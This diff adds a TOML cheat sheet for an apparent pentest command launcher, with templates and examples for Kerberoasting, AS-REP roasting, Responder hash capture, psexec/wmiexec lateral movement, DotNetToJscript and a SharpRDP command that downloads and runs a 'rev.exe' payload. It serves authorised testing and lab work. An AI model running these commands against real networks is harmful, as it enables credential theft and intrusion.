@@ -1,0 +1,83 @@
+[command.PowerShell-Formatting]
+use_name = "PowerShell Formatting"
+local = true
+cmd_types = "sysadmin"
+short_desc = "Select and Filter object by Properties"
+args = "| Select-Object -Property <properties|AceType,Identity> | Format-List"
+
+[command.DotNetToJscript]
+use_name = "DotNetToJscript"
+local = true
+cmd_types = "compilation"
+short_desc = "Build JS file from C# Code"
+args = ".\\DotNetToJScript.exe <dll2tranform|.\\ExampleAssembly.dll> --lang=Jscript --ver=v4 -o <outfile|demo.js>"
+
+[command.Rubeus]
+use_name = "rubeus"
+local = true
+cmd_types = "pentest|network|windows"
+short_desc = "Request a TGS and try to crack the service account password"
+args = ".\\Rubeus.exe kerberoast /outfile:<outfile|hashes.kerberoast>"
+examples = [
+    ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"
+]
+
+[command.GetNPUsers]
+use_name = "GetNPUsers AS-REP roasting"
+local = false
+cmd_types = "pentest|network|windows"
+short_desc = "Request TGT from DC to later crack it. Only works if Kerberos pre-authentication is not activated!"
+args = "GetNPUsers.py -dc-ip <dc-ip|127.0.0.1>  -request -outputfile <outputfile|hashes-asrep.roast> <domain|corp.com/user>"
+examples = [
+    "GetNPUsers.py -dc-ip 127.0.0.1  -request -outputfile hashes-asrep.roast corp.com/user"
+]
+
+[command.Responder]
+use_name = "responder"
+local = false
+cmd_types = "pentest|windows"
+short_desc = "Gather NTHASH on network"
+args = "python3 Responder.py -I <local-interface> -i <ip|127.0.0.1>"
+examples = [
+    "sudo python3 Responder.py -I enp0s3 -i 192.168.3.85"
+]
+
+[command.PsExec-Impacket]
+use_name = "psexec"
+local = false
+cmd_types = "pentest|windows"
+short_desc = "psexec - connect with psexec"
+args = "psexec.py '<username|corp.com/user>:<password|password>@<ip|127.0.0.1>'"
+examples = [
+    "psexec.py 'corp.com/user:password@127.0.0.1'"
+]
+
+[command.WMIExec-Impacket]
+use_name = "wmiexec"
+local = false
+cmd_types = "pentest|windows"
+short_desc = "wmiexec - connect with wmi"
+args = "wmiexec.py '<username|corp.com/user>:<password|password>@<ip|127.0.0.1>'"
+examples = [
+    "wmiexec.py 'corp.com/user:password@127.0.0.1'"
+]
+
+[command.PsExec-Windows]
+use_name = "psexec"
+local = false
+cmd_types = "pentest|windows"
+short_desc = "PsExec info"
+args = ".\\PsExec64.exe -i  \\\\<machine|127.0.0.1> -u <username|corp\\jen> -p <password|password> cmd"
+examples = [
+    ".\\PsExec64.exe -i  \\\\FILES04 -u corp\\jen -p Nexus123! cmd"
+]
+
+[command.SharpRDP]
+use_name = "SharpRDP"
+local = false
+cmd_types = "lateralization|windows"
+short_desc = "SharpRDP Lateralization with DL and reverse connect"
+args = ".\\SharpRDP.exe computername=<target-hostname> username=<domain\\user> password=<password> command=\"powershell (New-Object System.Net.WebClient).DownloadFile('<URI>', '<save-path>'); <save-path>\""
+examples = [
+    ".\\SharpRDP.exe computername=appsrv01 username=corp1\\dave password=lab command=\"powershell (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/rev.exe', 'C:\\Windows\\Tasks\\rev.exe'); C:\\Windows\\Tasks\\rev.exe\""
+]
